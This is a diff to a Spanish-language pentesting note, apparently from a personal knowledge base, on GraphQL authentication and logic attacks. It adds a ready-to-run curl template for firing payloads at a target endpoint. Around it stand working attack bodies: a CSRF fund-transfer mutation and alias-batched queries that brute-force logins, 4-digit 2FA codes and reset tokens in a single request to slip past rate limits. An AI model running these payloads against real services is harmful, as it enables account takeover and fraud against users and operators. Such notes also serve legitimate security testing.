@@ -23,6 +23,11 @@ linked:
 ---
 # GraphQL - Auth y Lógica
 
+> [!tip] Comando base
+> Los payloads `{"query":...}` se lanzan con:
+> `curl -sX POST -H 'Content-Type: application/json' -d '<BODY>' https://target/graphql`
+> Las filas con `sqlmap`, `curl`, `echo` o loops bash son comandos completos ejecutables tal cual.
+
 ---
 
 ## CSRF en GraphQL
@@ -58,7 +63,8 @@ Body literal: `{"query":"mutation{transferFunds(to:\"attacker\",amount:1000)}","
 | `{"query":"{a:login(u:\"x\",p:\"1\"){token} b:login(u:\"x\",p:\"2\"){token}}"}` | Aliases bruteforce login | Equivalente a batch sin spec batch. |
 | `{"query":"{a:verify2FA(code:\"0001\"){ok} b:verify2FA(code:\"0002\"){ok} ...}"}` | Brute 4-dígitos 2FA en single request | OTP race + rate limit bypass. |
 | `{"query":"{a:resetPwd(token:\"a\"){ok} b:resetPwd(token:\"b\"){ok}}"}` | Brute reset tokens | Si tokens son cortos. |
-| Generar batch con bash loop → `curl ... -d "$BATCH"` | Brute 100-1000 attempts en 1 request | Ver code block. |
+
+Para 100-1000 intentos generados desde wordlist en un request: ver **Batch bruteforce login (bash one-liner)** abajo.
 ^graphql-auth-batching
 
 ### Batch bruteforce login (bash one-liner)
